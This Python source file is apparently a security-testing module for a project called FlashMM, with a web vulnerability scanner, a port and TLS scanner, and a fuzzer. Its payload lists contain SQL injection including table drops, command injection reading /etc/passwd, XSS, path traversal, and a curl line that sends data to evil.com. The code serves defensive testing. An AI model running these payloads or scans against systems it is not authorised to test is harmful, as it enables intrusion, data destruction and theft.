"""
FlashMM Penetration Testing Framework

Comprehensive automated security testing framework with vulnerability scanning,
security baseline measurement, regression testing, and performance impact analysis.
"""

import asyncio
import secrets
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass
from datetime import datetime
from enum import Enum
from typing import Any

import requests

from flashmm.config.settings import get_config
from flashmm.utils.exceptions import SecurityError
from flashmm.utils.logging import SecurityLogger

logger = SecurityLogger()


class TestSeverity(Enum):
    """Severity levels for security test findings."""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class TestCategory(Enum):
    """Categories of security tests."""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INJECTION = "injection"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    CRYPTOGRAPHIC_FAILURES = "cryptographic_failures"
    INSECURE_DESIGN = "insecure_design"
    VULNERABLE_COMPONENTS = "vulnerable_components"
    LOGGING_MONITORING = "logging_monitoring"
    NETWORK_SECURITY = "network_security"
    INPUT_VALIDATION = "input_validation"
    SESSION_MANAGEMENT = "session_management"


class TestType(Enum):
    """Types of security tests."""
    AUTOMATED_SCAN = "automated_scan"
    MANUAL_TEST = "manual_test"
    FUZZING = "fuzzing"
    BRUTE_FORCE = "brute_force"
    INJECTION_TEST = "injection_test"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    INFORMATION_DISCLOSURE = "information_disclosure"
    DENIAL_OF_SERVICE = "denial_of_service"
    BUSINESS_LOGIC = "business_logic"
    COMPLIANCE_CHECK = "compliance_check"


@dataclass
class TestFinding:
    """Security test finding."""
    finding_id: str
    test_id: str
    title: str
    description: str
    severity: TestSeverity
    category: TestCategory
    affected_component: str
    affected_endpoint: str | None
    vulnerability_type: str
    proof_of_concept: str
    remediation: str
    references: list[str]
    cvss_score: float | None
    timestamp: datetime
    false_positive: bool = False
    verified: bool = False
    metadata: dict[str, Any] | None = None

    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}


@dataclass
class SecurityTest:
    """Security test definition."""
    test_id: str
    name: str
    description: str
    category: TestCategory
    test_type: TestType
    severity: TestSeverity
    target_component: str
    test_function: str
    prerequisites: list[str]
    expected_result: str
    timeout_seconds: int
    enabled: bool = True
    metadata: dict[str, Any] | None = None

    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}


@dataclass
class TestSuite:
    """Collection of security tests."""
    suite_id: str
    name: str
    description: str
    tests: list[SecurityTest]
    categories: list[TestCategory]
    estimated_duration: int  # seconds
    parallel_execution: bool = False
    metadata: dict[str, Any] | None = None

    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}


@dataclass
class TestResult:
    """Result of a security test execution."""
    test_id: str
    suite_id: str
    status: str  # passed, failed, error, skipped
    start_time: datetime
    end_time: datetime
    duration_seconds: float
    findings: list[TestFinding]
    performance_impact: dict[str, Any]
    logs: list[str]
    metadata: dict[str, Any] | None = None

    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}


class VulnerabilityScanner:
    """Automated vulnerability scanner for various attack vectors."""

    def __init__(self):
        self.config = get_config()
        self.scan_profiles = self._load_scan_profiles()

    def _load_scan_profiles(self) -> dict[str, dict[str, Any]]:
        """Load vulnerability scan profiles."""
        return {
            "basic": {
                "timeout": 30,
                "max_threads": 10,
                "scan_depth": "surface",
                "checks": ["info_disclosure", "basic_auth", "common_vulns"]
            },
            "comprehensive": {
                "timeout": 300,
                "max_threads": 20,
                "scan_depth": "deep",
                "checks": ["all"]
            },
            "targeted": {
                "timeout": 60,
                "max_threads": 5,
                "scan_depth": "focused",
                "checks": ["custom"]
            }
        }

    async def scan_web_application(self, base_url: str,
                                 profile: str = "basic") -> list[TestFinding]:
        """Scan web application for vulnerabilities."""
        findings = []

        _scan_config = self.scan_profiles.get(profile, self.scan_profiles["basic"])

        # Information disclosure tests
        findings.extend(await self._test_information_disclosure(base_url))

        # Authentication bypass tests
        findings.extend(await self._test_authentication_bypass(base_url))

        # Authorization tests
        findings.extend(await self._test_authorization_flaws(base_url))

        # Injection tests
        findings.extend(await self._test_injection_vulnerabilities(base_url))

        # Security headers tests
        findings.extend(await self._test_security_headers(base_url))

        # Session management tests
        findings.extend(await self._test_session_management(base_url))

        return findings

    async def _test_information_disclosure(self, base_url: str) -> list[TestFinding]:
        """Test for information disclosure vulnerabilities."""
        findings = []

        # Test common sensitive paths
        sensitive_paths = [
            "/.env", "/config.json", "/admin", "/debug", "/test",
            "/swagger-ui", "/api-docs", "/actuator", "/.git"
        ]

        for path in sensitive_paths:
            try:
                response = requests.get(f"{base_url}{path}", timeout=10)

                if response.status_code == 200:
                    # Check for sensitive information in response
                    content = response.text.lower()
                    sensitive_keywords = [
                        "password", "secret", "key", "token", "api_key",
                        "database", "connection", "credential"
                    ]

                    found_keywords = [kw for kw in sensitive_keywords if kw in content]

                    if found_keywords:
                        findings.append(TestFinding(
                            finding_id=f"info_disc_{secrets.token_hex(4)}",
                            test_id="web_info_disclosure",
                            title=f"Information Disclosure - {path}",
                            description=f"Sensitive information exposed at {path}",
                            severity=TestSeverity.MEDIUM,
                            category=TestCategory.SECURITY_MISCONFIGURATION,
                            affected_component="web_application",
                            affected_endpoint=f"{base_url}{path}",
                            vulnerability_type="Information Disclosure",
                            proof_of_concept=f"GET {path} returns sensitive data: {found_keywords}",
                            remediation="Remove or restrict access to sensitive endpoints",
                            references=["CWE-200"],
                            cvss_score=5.3,
                            timestamp=datetime.utcnow(),
                            metadata={"keywords_found": found_keywords}
                        ))

            except (requests.RequestException, requests.ConnectionError, requests.Timeout):
                # Connection errors are expected for non-existent endpoints
                pass

        return findings

    async def _test_authentication_bypass(self, base_url: str) -> list[TestFinding]:
        """Test for authentication bypass vulnerabilities."""
        findings = []

        # Test SQL injection in login
        login_payloads = [
            "admin' OR '1'='1' --",
            "admin'/*",
            "' OR 1=1#",
            "admin' OR 'x'='x",
            "' UNION SELECT 1,2,3--"
        ]

        auth_endpoints = ["/login", "/auth", "/api/login", "/api/auth"]

        for endpoint in auth_endpoints:
            for payload in login_payloads:
                try:
                    data = {
                        "username": payload,
                        "password": "test"
                    }

                    response = requests.post(
                        f"{base_url}{endpoint}",
                        data=data,
                        timeout=10,
                        allow_redirects=False
                    )

                    # Check for successful authentication indicators
                    if (response.status_code in [200, 302] and
                        any(indicator in response.text.lower() for indicator in
                            ["success", "welcome", "dashboard", "token", "session"])):

                        findings.append(TestFinding(
                            finding_id=f"auth_bypass_{secrets.token_hex(4)}",
                            test_id="auth_bypass_sqli",
                            title="SQL Injection in Authentication",
                            description=f"Authentication bypass via SQL injection at {endpoint}",
                            severity=TestSeverity.CRITICAL,
                            category=TestCategory.INJECTION,
                            affected_component="authentication",
                            affected_endpoint=f"{base_url}{endpoint}",
                            vulnerability_type="SQL Injection",
                            proof_of_concept=f"POST {endpoint} with username='{payload}' bypasses authentication",
                            remediation="Use parameterized queries and input validation",
                            references=["CWE-89", "OWASP-A03"],
                            cvss_score=9.8,
                            timestamp=datetime.utcnow(),
                            metadata={"payload": payload}
                        ))

                except (requests.RequestException, requests.ConnectionError, requests.Timeout):
                    pass  # Expected connection errors during testing

        return findings

    async def _test_authorization_flaws(self, base_url: str) -> list[TestFinding]:
        """Test for authorization vulnerabilities."""
        findings = []

        # Test for missing authorization on sensitive endpoints
        sensitive_endpoints = [
            "/admin", "/api/admin", "/management", "/config",
            "/users", "/api/users", "/settings", "/api/settings"
        ]

        for endpoint in sensitive_endpoints:
            try:
                # Test without authentication
                response = requests.get(f"{base_url}{endpoint}", timeout=10)

                if response.status_code == 200:
                    findings.append(TestFinding(
                        finding_id=f"authz_missing_{secrets.token_hex(4)}",
                        test_id="missing_authorization",
                        title="Missing Authorization",
                        description=f"Sensitive endpoint {endpoint} accessible without authentication",
                        severity=TestSeverity.HIGH,
                        category=TestCategory.BROKEN_ACCESS_CONTROL,
                        affected_component="authorization",
                        affected_endpoint=f"{base_url}{endpoint}",
                        vulnerability_type="Missing Access Control",
                        proof_of_concept=f"GET {endpoint} returns 200 without authentication",
                        remediation="Implement proper authorization checks",
                        references=["CWE-862", "OWASP-A01"],
                        cvss_score=7.5,
                        timestamp=datetime.utcnow()
                    ))

            except (requests.RequestException, requests.ConnectionError, requests.Timeout):
                pass  # Expected connection errors during testing

        return findings

    async def _test_injection_vulnerabilities(self, base_url: str) -> list[TestFinding]:
        """Test for various injection vulnerabilities."""
        findings = []

        # SQL Injection test payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT version() --",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]

        # Command injection payloads
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "; ls -la",
            "&& ping -c 1 127.0.0.1"
        ]

        # Test common parameter names
        test_params = ["id", "user", "search", "query", "cmd", "file", "path"]

        api_endpoints = ["/api/search", "/api/query", "/api/user", "/search"]

        for endpoint in api_endpoints:
            for param in test_params:
                # Test SQL injection
                for payload in sql_payloads:
                    try:
                        response = requests.get(
                            f"{base_url}{endpoint}",
                            params={param: payload},
                            timeout=10
                        )

                        # Check for SQL error indicators
                        error_indicators = [
                            "sql syntax", "mysql", "postgresql", "sqlite",
                            "syntax error", "sql error", "database error"
                        ]

                        if any(indicator in response.text.lower() for indicator in error_indicators):
                            findings.append(TestFinding(
                                finding_id=f"sqli_{secrets.token_hex(4)}",
                                test_id="sql_injection",
                                title="SQL Injection Vulnerability",
                                description=f"SQL injection found in parameter '{param}' at {endpoint}",
                                severity=TestSeverity.HIGH,
                                category=TestCategory.INJECTION,
                                affected_component="database",
                                affected_endpoint=f"{base_url}{endpoint}",
                                vulnerability_type="SQL Injection",
                                proof_of_concept=f"GET {endpoint}?{param}={payload} triggers SQL error",
                                remediation="Use parameterized queries and input validation",
                                references=["CWE-89", "OWASP-A03"],
                                cvss_score=8.2,
                                timestamp=datetime.utcnow(),
                                metadata={"parameter": param, "payload": payload}
                            ))

                    except (requests.RequestException, requests.ConnectionError, requests.Timeout):
                        pass  # Expected connection errors during testing

                # Test command injection
                for payload in cmd_payloads:
                    try:
                        response = requests.get(
                            f"{base_url}{endpoint}",
                            params={param: payload},
                            timeout=10
                        )

                        # Check for command execution indicators
                        cmd_indicators = [
                            "root:", "bin/", "total ", "uid=", "gid="
                        ]

                        if any(indicator in response.text for indicator in cmd_indicators):
                            findings.append(TestFinding(
                                finding_id=f"cmdi_{secrets.token_hex(4)}",
                                test_id="command_injection",
                                title="Command Injection Vulnerability",
                                description=f"Command injection found in parameter '{param}' at {endpoint}",
                                severity=TestSeverity.CRITICAL,
                                category=TestCategory.INJECTION,
                                affected_component="system",
                                affected_endpoint=f"{base_url}{endpoint}",
                                vulnerability_type="Command Injection",
                                proof_of_concept=f"GET {endpoint}?{param}={payload} executes system commands",
                                remediation="Sanitize inputs and avoid system command execution",
                                references=["CWE-78", "OWASP-A03"],
                                cvss_score=9.8,
                                timestamp=datetime.utcnow(),
                                metadata={"parameter": param, "payload": payload}
                            ))

                    except (requests.RequestException, requests.ConnectionError, requests.Timeout):
                        pass  # Expected connection errors during testing

        return findings

    async def _test_security_headers(self, base_url: str) -> list[TestFinding]:
        """Test for missing security headers."""
        findings = []

        try:
            response = requests.get(base_url, timeout=10)
            headers = response.headers

            required_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": None,  # Any value is good
                "Content-Security-Policy": None,
                "Referrer-Policy": None
            }

            for header, expected_values in required_headers.items():
                if header not in headers:
                    severity = TestSeverity.MEDIUM
                    if header in ["Strict-Transport-Security", "Content-Security-Policy"]:
                        severity = TestSeverity.HIGH

                    findings.append(TestFinding(
                        finding_id=f"missing_header_{secrets.token_hex(4)}",
                        test_id="missing_security_headers",
                        title=f"Missing Security Header: {header}",
                        description=f"Required security header '{header}' is missing",
                        severity=severity,
                        category=TestCategory.SECURITY_MISCONFIGURATION,
                        affected_component="web_server",
                        affected_endpoint=base_url,
                        vulnerability_type="Missing Security Header",
                        proof_of_concept=f"Response lacks '{header}' header",
                        remediation=f"Add '{header}' header to all responses",
                        references=["OWASP-ASVS"],
                        cvss_score=4.3 if severity == TestSeverity.MEDIUM else 6.1,
                        timestamp=datetime.utcnow(),
                        metadata={"header": header}
                    ))
                elif expected_values and headers[header] not in expected_values:
                    findings.append(TestFinding(
                        finding_id=f"weak_header_{secrets.token_hex(4)}",
                        test_id="weak_security_headers",
                        title=f"Weak Security Header: {header}",
                        description=f"Security header '{header}' has weak value",
                        severity=TestSeverity.LOW,
                        category=TestCategory.SECURITY_MISCONFIGURATION,
                        affected_component="web_server",
                        affected_endpoint=base_url,
                        vulnerability_type="Weak Security Header",
                        proof_of_concept=f"Header '{header}' value is '{headers[header]}'",
                        remediation=f"Set '{header}' to one of: {expected_values}",
                        references=["OWASP-ASVS"],
                        cvss_score=3.1,
                        timestamp=datetime.utcnow(),
                        metadata={"header": header, "current_value": headers[header]}
                    ))

        except (requests.RequestException, requests.ConnectionError, requests.Timeout):
            pass  # Expected connection errors during testing

        return findings

    async def _test_session_management(self, base_url: str) -> list[TestFinding]:
        """Test session management security."""
        findings = []

        try:
            # Test session cookie security
            session = requests.Session()
            session.get(base_url, timeout=10)

            for cookie in session.cookies:
                # Check for secure flag
                if not cookie.secure and base_url.startswith("https"):
                    findings.append(TestFinding(
                        finding_id=f"insecure_cookie_{secrets.token_hex(4)}",
                        test_id="insecure_session_cookie",
                        title="Session Cookie Missing Secure Flag",
                        description=f"Cookie '{cookie.name}' lacks Secure flag",
                        severity=TestSeverity.MEDIUM,
                        category=TestCategory.SESSION_MANAGEMENT,
                        affected_component="session_management",
                        affected_endpoint=base_url,
                        vulnerability_type="Insecure Cookie",
                        proof_of_concept=f"Cookie '{cookie.name}' can be transmitted over HTTP",
                        remediation="Set Secure flag on all session cookies",
                        references=["CWE-614"],
                        cvss_score=5.4,
                        timestamp=datetime.utcnow(),
                        metadata={"cookie_name": cookie.name}
                    ))

                # Check for HttpOnly flag
                if not cookie.has_nonstandard_attr("HttpOnly"):
                    findings.append(TestFinding(
                        finding_id=f"xss_cookie_{secrets.token_hex(4)}",
                        test_id="non_httponly_cookie",
                        title="Session Cookie Missing HttpOnly Flag",
                        description=f"Cookie '{cookie.name}' lacks HttpOnly flag",
                        severity=TestSeverity.MEDIUM,
                        category=TestCategory.SESSION_MANAGEMENT,
                        affected_component="session_management",
                        affected_endpoint=base_url,
                        vulnerability_type="XSS via Cookie",
                        proof_of_concept=f"Cookie '{cookie.name}' accessible via JavaScript",
                        remediation="Set HttpOnly flag on all session cookies",
                        references=["CWE-1004"],
                        cvss_score=5.4,
                        timestamp=datetime.utcnow(),
                        metadata={"cookie_name": cookie.name}
                    ))

        except (requests.RequestException, requests.ConnectionError, requests.Timeout):
            pass  # Expected connection errors during testing

        return findings


class NetworkScanner:
    """Network security scanner for ports, services, and configurations."""

    def __init__(self):
        self.config = get_config()

    async def scan_network_security(self, target_host: str,
                                  port_range: tuple[int, int] = (1, 1000)) -> list[TestFinding]:
        """Scan network security for a target host."""
        findings = []

        # Port scan
        findings.extend(await self._scan_open_ports(target_host, port_range))

        # SSL/TLS scan
        findings.extend(await self._scan_ssl_configuration(target_host))

        # Service enumeration
        findings.extend(await self._enumerate_services(target_host))

        return findings

    async def _scan_open_ports(self, host: str, port_range: tuple[int, int]) -> list[TestFinding]:
        """Scan for open ports."""
        findings = []
        open_ports = []

        start_port, end_port = port_range

        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {
                executor.submit(self._check_port, host, port): port
                for port in range(start_port, end_port + 1)
            }

            for future in as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    if future.result():
                        open_ports.append(port)
                except OSError:
                    pass  # Expected socket errors during port scanning

        # Analyze open ports
        risky_ports = {
            21: "FTP", 23: "Telnet", 53: "DNS", 135: "RPC",
            139: "NetBIOS", 445: "SMB", 1433: "MSSQL", 3389: "RDP"
        }

        for port in open_ports:
            severity = TestSeverity.INFO
            if port in risky_ports:
                severity = TestSeverity.MEDIUM

            findings.append(TestFinding(
                finding_id=f"open_port_{port}",
                test_id="network_port_scan",
                title=f"Open Port: {port}",
                description=f"Port {port} is open on {host}",
                severity=severity,
                category=TestCategory.NETWORK_SECURITY,
                affected_component="network",
                affected_endpoint=f"{host}:{port}",
                vulnerability_type="Open Port",
                proof_of_concept=f"TCP connection to {host}:{port} successful",
                remediation="Close unnecessary ports or restrict access",
                references=["CWE-200"],
                cvss_score=3.1 if severity == TestSeverity.INFO else 5.3,
                timestamp=datetime.utcnow(),
                metadata={"port": port, "service": risky_ports.get(port, "Unknown")}
            ))

        return findings

    def _check_port(self, host: str, port: int, timeout: int = 1) -> bool:
        """Check if a specific port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    async def _scan_ssl_configuration(self, host: str, port: int = 443) -> list[TestFinding]:
        """Scan SSL/TLS configuration."""
        findings = []

        try:
            # Check if port 443 is open
            if not self._check_port(host, port):
                return findings

            context = ssl.create_default_context()

            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    protocol = ssock.version()

                    # Check certificate expiration
                    not_after_str = cert.get('notAfter') if cert else None
                    if not not_after_str:
                        return findings  # Skip if no expiration date

                    # Ensure not_after_str is a string before passing to strptime
                    if isinstance(not_after_str, str):
                        not_after = datetime.strptime(not_after_str, '%b %d %H:%M:%S %Y %Z')
                    else:
                        return findings  # Skip if not a string
                    days_until_expiry = (not_after - datetime.utcnow()).days

                    if days_until_expiry < 30:
                        findings.append(TestFinding(
                            finding_id=f"ssl_expiry_{secrets.token_hex(4)}",
                            test_id="ssl_certificate_expiry",
                            title="SSL Certificate Near Expiry",
                            description=f"SSL certificate expires in {days_until_expiry} days",
                            severity=TestSeverity.MEDIUM if days_until_expiry > 7 else TestSeverity.HIGH,
                            category=TestCategory.CRYPTOGRAPHIC_FAILURES,
                            affected_component="ssl_certificate",
                            affected_endpoint=f"{host}:{port}",
                            vulnerability_type="Certificate Expiry",
                            proof_of_concept=f"Certificate expires on {not_after}",
                            remediation="Renew SSL certificate before expiry",
                            references=["CWE-298"],
                            cvss_score=5.3,
                            timestamp=datetime.utcnow(),
                            metadata={"expiry_date": not_after.isoformat(), "days_remaining": days_until_expiry}
                        ))

                    # Check for weak protocols
                    if protocol in ['TLSv1', 'TLSv1.1']:
                        findings.append(TestFinding(
                            finding_id=f"weak_tls_{secrets.token_hex(4)}",
                            test_id="weak_tls_protocol",
                            title="Weak TLS Protocol",
                            description=f"Server supports weak TLS protocol: {protocol}",
                            severity=TestSeverity.HIGH,
                            category=TestCategory.CRYPTOGRAPHIC_FAILURES,
                            affected_component="tls_configuration",
                            affected_endpoint=f"{host}:{port}",
                            vulnerability_type="Weak Cryptography",
                            proof_of_concept=f"Connection established using {protocol}",
                            remediation="Disable TLS 1.0 and 1.1, use TLS 1.2+",
                            references=["CWE-326"],
                            cvss_score=7.4,
                            timestamp=datetime.utcnow(),
                            metadata={"protocol": protocol}
                        ))

                    # Check for weak ciphers
                    if cipher and len(cipher) > 1 and isinstance(cipher[1], int | str):
                        key_size = int(cipher[1]) if isinstance(cipher[1], str) else cipher[1]
                        if key_size < 128:  # Key size less than 128 bits
                            findings.append(TestFinding(
                                finding_id=f"weak_cipher_{secrets.token_hex(4)}",
                                test_id="weak_ssl_cipher",
                                title="Weak SSL Cipher",
                                description=f"Server uses weak cipher: {cipher[0]}",
                                severity=TestSeverity.HIGH,
                                category=TestCategory.CRYPTOGRAPHIC_FAILURES,
                                affected_component="ssl_cipher",
                                affected_endpoint=f"{host}:{port}",
                                vulnerability_type="Weak Cryptography",
                                proof_of_concept=f"Cipher suite: {cipher[0]} with {key_size}-bit keys",
                                remediation="Configure strong cipher suites (256-bit+)",
                                references=["CWE-326"],
                                cvss_score=7.4,
                                timestamp=datetime.utcnow(),
                                metadata={"cipher": cipher[0], "key_size": key_size}
                            ))

        except (OSError, ssl.SSLError):
            # SSL connection failed - expected during testing
            pass

        return findings

    async def _enumerate_services(self, host: str) -> list[TestFinding]:
        """Enumerate running services."""
        findings = []

        common_ports = {
            22: "SSH", 80: "HTTP", 443: "HTTPS", 21: "FTP",
            25: "SMTP", 53: "DNS", 110: "POP3", 143: "IMAP",
            993: "IMAPS", 995: "POP3S", 3306: "MySQL", 5432: "PostgreSQL"
        }

        for port, service in common_ports.items():
            if self._check_port(host, port, timeout=2):
                try:
                    # Try to get service banner
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((host, port))

                    if service == "HTTP":
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    elif service == "SSH":
                        pass  # SSH sends banner immediately
                    else:
                        sock.send(b"\r\n")

                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    sock.close()

                    # Check for version disclosure
                    if banner and any(keyword in banner.lower() for keyword in
                                    ['version', 'server', 'apache', 'nginx', 'openssh']):
                        findings.append(TestFinding(
                            finding_id=f"banner_grab_{port}",
                            test_id="service_banner_grabbing",
                            title=f"Service Version Disclosure: {service}",
                            description=f"Service {service} on port {port} discloses version information",
                            severity=TestSeverity.LOW,
                            category=TestCategory.SECURITY_MISCONFIGURATION,
                            affected_component="service",
                            affected_endpoint=f"{host}:{port}",
                            vulnerability_type="Information Disclosure",
                            proof_of_concept=f"Banner: {banner[:100]}...",
                            remediation="Configure service to hide version information",
                            references=["CWE-200"],
                            cvss_score=3.1,
                            timestamp=datetime.utcnow(),
                            metadata={"service": service, "banner": banner[:200]}
                        ))

                except OSError:
                    pass  # Expected socket errors during service enumeration

        return findings


class FuzzingEngine:
    """Fuzzing engine for input validation and edge case testing."""

    def __init__(self):
        self.config = get_config()
        self.payloads = self._load_fuzzing_payloads()

    def _load_fuzzing_payloads(self) -> dict[str, list[str]]:
        """Load fuzzing payloads for different test types."""
        return {
            "sql_injection": [
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "' UNION SELECT 1,2,3 --",
                "admin'--",
                "' OR 1=1#",
                "1' ORDER BY 10--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>"
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& ls -la",
                "; ping -c 1 127.0.0.1",
                "$(whoami)",
                "`id`",
                "; curl http://evil.com/$(whoami)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "/var/log/apache/access.log",
                "file:///etc/passwd"
            ],
            "buffer_overflow": [
                "A" * 1000,
                "A" * 5000,
                "A" * 10000,
                "%s" * 1000,
                "\x00" * 1000,
                "\xff" * 1000
            ],
            "format_string": [
                "%x%x%x%x",
                "%n%n%n%n",
                "%s%s%s%s",
                "%p%p%p%p",
                "AAAA%08x.%08x.%08x",
                "%999999999d"
            ]
        }

    async def fuzz_endpoint(self, base_url: str, endpoint: str,
                           parameters: list[str],
                           payload_types: list[str] | None = None) -> list[TestFinding]:
        """Fuzz an endpoint with various payloads."""
        findings = []

        if payload_types is None:
            payload_types = list(self.payloads.keys())

        for payload_type in payload_types:
            if payload_type not in self.payloads:
                continue

            for parameter in parameters:
                for payload in self.payloads[payload_type]:
                    try:
                        # Test GET parameter
                        response = requests.get(
                            f"{base_url}{endpoint}",
                            params={parameter: payload},
                            timeout=10
                        )

                        # Analyze response for vulnerabilities
                        vulnerability = self._analyze_fuzz_response(
                            response, payload_type, payload, parameter, endpoint
                        )

                        if vulnerability:
                            findings.append(vulnerability)

                        # Test POST parameter
                        response = requests.post(
                            f"{base_url}{endpoint}",
                            data={parameter: payload},
                            timeout=10
                        )

                        vulnerability = self._analyze_fuzz_response(
                            response, payload_type, payload, parameter, endpoint
                        )

                        if vulnerability:
                            findings.append(vulnerability)

                    except (requests.RequestException, requests.ConnectionError, requests.Timeout):
                        pass  # Expected connection errors during fuzzing

        return findings

    def _analyze_fuzz_response(self, response, payload_type: str, payload: str,
                              parameter: str, endpoint: str) -> TestFinding | None:
        """Analyze fuzzing response for vulnerabilities."""

        # Check for error responses that might indicate vulnerabilities
        error_indicators = {
            "sql_injection": [
                "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
                "syntax error", "sql error", "database error", "odbc error"
            ],
            "xss": [
                payload.lower()  # Check if payload is reflected
            ],
            "command_injection": [
                "root:", "bin/", "uid=", "gid=", "total ", "/bin/sh"
            ],
            "path_traversal": [
                "root:x:", "[boot loader]", "for 16-bit app support"
            ]
        }

        indicators = error_indicators.get(payload_type, [])

        for indicator in indicators:
            if indicator in response.text.lower():
                severity = TestSeverity.HIGH
                if payload_type in ["sql_injection", "command_injection"]:
                    severity = TestSeverity.CRITICAL

                return TestFinding(
                    finding_id=f"fuzz_{payload_type}_{secrets.token_hex(4)}",
                    test_id=f"fuzzing_{payload_type}",
                    title=f"{payload_type.replace('_', ' ').title()} Vulnerability",
                    description=f"{payload_type} vulnerability found in parameter '{parameter}'",
                    severity=severity,
                    category=TestCategory.INJECTION,
                    affected_component="web_application",
                    affected_endpoint=endpoint,
                    vulnerability_type=payload_type.replace('_', ' ').title(),
                    proof_of_concept=f"Parameter '{parameter}' vulnerable to payload: {payload[:100]}",
                    remediation="Implement proper input validation and sanitization",
                    references=["OWASP-A03"],
                    cvss_score=8.2 if severity == TestSeverity.CRITICAL else 6.5,
                    timestamp=datetime.utcnow(),
                    metadata={
                        "parameter": parameter,
                        "payload": payload,
                        "response_length": len(response.text),
                        "status_code": response.status_code
                    }
                )

        return None


class PenetrationTestFramework:
    """Main penetration testing framework coordinating all testing components."""

    def __init__(self):
        self.config = get_config()

        # Initialize testing components
        self.vulnerability_scanner = VulnerabilityScanner()
        self.network_scanner = NetworkScanner()
        self.fuzzing_engine = FuzzingEngine()

        # Test management
        self.test_suites: dict[str, TestSuite] = {}
        self.test_results: list[TestResult] = []

        # Performance tracking
        self.performance_metrics = {
            "tests_executed": 0,
            "vulnerabilities_found": 0,
            "false_positives": 0,
            "average_test_time": 0,
            "total_test_time": 0
        }

        # Load default test suites
        self._load_default_test_suites()

    def _load_default_test_suites(self) -> None:
        """Load default penetration test suites."""

        # OWASP Top 10 Test Suite
        owasp_suite = TestSuite(
            suite_id="owasp_top10",
            name="OWASP Top 10 Security Tests",
            description="Comprehensive tests based on OWASP Top 10 vulnerabilities",
            tests=[
                SecurityTest(
                    test_id="broken_access_control",
                    name="Broken Access Control",
                    description="Test for access control vulnerabilities",
                    category=TestCategory.BROKEN_ACCESS_CONTROL,
                    test_type=TestType.AUTOMATED_SCAN,
                    severity=TestSeverity.HIGH,
                    target_component="web_application",
                    test_function="test_access_control",
                    prerequisites=["running_web_app"],
                    expected_result="No unauthorized access",
                    timeout_seconds=300
                ),
                SecurityTest(
                    test_id="cryptographic_failures",
                    name="Cryptographic Failures",
                    description="Test for weak cryptographic implementations",
                    category=TestCategory.CRYPTOGRAPHIC_FAILURES,
                    test_type=TestType.AUTOMATED_SCAN,
                    severity=TestSeverity.HIGH,
                    target_component="encryption",
                    test_function="test_cryptography",
                    prerequisites=["ssl_enabled"],
                    expected_result="Strong cryptographic controls",
                    timeout_seconds=180
                ),
                SecurityTest(
                    test_id="injection_attacks",
                    name="Injection Attacks",
                    description="Test for various injection vulnerabilities",
                    category=TestCategory.INJECTION,
                    test_type=TestType.FUZZING,
                    severity=TestSeverity.CRITICAL,
                    target_component="input_validation",
                    test_function="test_injection",
                    prerequisites=["database_connected"],
                    expected_result="No injection vulnerabilities",
                    timeout_seconds=600
                )
            ],
            categories=[TestCategory.BROKEN_ACCESS_CONTROL, TestCategory.CRYPTOGRAPHIC_FAILURES, TestCategory.INJECTION],
            estimated_duration=1080,  # 18 minutes
            parallel_execution=True
        )

        # Network Security Test Suite
        network_suite = TestSuite(
            suite_id="network_security",
            name="Network Security Assessment",
            description="Comprehensive network security testing",
            tests=[
                SecurityTest(
                    test_id="port_scan",
                    name="Port Scanning",
                    description="Scan for open ports and services",
                    category=TestCategory.NETWORK_SECURITY,
                    test_type=TestType.AUTOMATED_SCAN,
                    severity=TestSeverity.MEDIUM,
                    target_component="network",
                    test_function="scan_ports",
                    prerequisites=["network_accessible"],
                    expected_result="Only necessary ports open",
                    timeout_seconds=300
                ),
                SecurityTest(
                    test_id="ssl_tls_test",
                    name="SSL/TLS Configuration",
                    description="Test SSL/TLS implementation",
                    category=TestCategory.CRYPTOGRAPHIC_FAILURES,
                    test_type=TestType.AUTOMATED_SCAN,
                    severity=TestSeverity.HIGH,
                    target_component="ssl_tls",
                    test_function="test_ssl_tls",
                    prerequisites=["ssl_enabled"],
                    expected_result="Strong SSL/TLS configuration",
                    timeout_seconds=120
                )
            ],
            categories=[TestCategory.NETWORK_SECURITY, TestCategory.CRYPTOGRAPHIC_FAILURES],
            estimated_duration=420,  # 7 minutes
            parallel_execution=True
        )

        self.test_suites["owasp_top10"] = owasp_suite
        self.test_suites["network_security"] = network_suite

